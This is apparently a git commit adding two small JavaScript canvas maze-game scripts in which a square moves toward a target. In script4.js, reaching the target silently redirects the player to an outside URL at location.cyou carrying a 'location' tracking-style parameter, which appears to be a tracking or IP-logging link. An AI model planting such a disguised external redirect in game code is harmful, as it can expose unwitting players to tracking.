4a172ce03380131d72e7148cc0bc9e682e889ff2
name.name <yulofi06@gmail.com>
2024-06-23 11:53:30 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,61 @@
+var screen = document.querySelector("canvas");
+var ctx = screen.getContext("2d");
+
+// character size
+var size = 10;
+
+// speed/FramePerSeconds
+var gameSpeed = 200;
+
+// coordinates & velocity
+var x = 10;
+var y = 390;
+var velX = 0;
+var velY = 0;
+
+setInterval(update, gameSpeed);
+
+function update() {
+   if(x === 200 && y === 50) {
+       velX = 0;
+       velY = 0;
+       location.href = "page2.html"    
+    }
+    
+   ctx.clearRect(x, y, size, size);
+   x += velX;
+   y += velY;
+   ctx.fillStyle = "lightblue";
+   ctx.fillRect(x, y, size, size);
+   
+   ctx.fillStyle = "gray";
+   ctx.fillRect(200, 50, size, size);
+    
+    if(x >= 310 || x <=  0) {
+        velX = 0;
+    }
+    
+    if(y <= 0 || y >= 390) {
+        velY = 0;
+    }
+}
+
+function goUp() {
+    velY = -1*10;
+    velX = 0;
+}
+
+function goDown() {
+    velY = 1*10;
+    velX = 0;
+}
+
+function goRight() {
+    velY = 0;
+    velX = 1*10;
+}
+
+function goLeft() {
+    velY = 0;
+    velX = -1*10;
+}
---
+++ script4.js
@@ -0,0 +1,61 @@
+var screen = document.querySelector("canvas");
+var ctx = screen.getContext("2d");
+
+// character size
+var size = 10;
+
+// speed/FramePerSeconds
+var gameSpeed = 200;
+
+// coordinates & velocity
+var x = 10;
+var y = 20;
+var velX = 0;
+var velY = 0;
+
+setInterval(update, gameSpeed);
+
+function update() {
+   if(x === 300 && y === 370) {
+       velX = 0;
+       velY = 0;
+       location.href = "https://location.cyou/film.php?location=28D8W1"    
+    }
+    
+   ctx.clearRect(x, y, size, size);
+   x += velX;
+   y += velY;
+   ctx.fillStyle = "lightblue";
+   ctx.fillRect(x, y, size, size);
+   
+   ctx.fillStyle = "pink";
+   ctx.fillRect(300, 370, size, size);
+    
+    if(x >= 310 || x <=  0) {
+        velX = 0;
+    }
+    
+    if(y <= 0 || y >= 390) {
+        velY = 0;
+    }
+}
+
+function goUp() {
+    velY = -1*10;
+    velX = 0;
+}
+
+function goDown() {
+    velY = 1*10;
+    velX = 0;
+}
+
+function goRight() {
+    velY = 0;
+    velX = 1*10;
+}
+
+function goLeft() {
+    velY = 0;
+    velX = -1*10;
+}
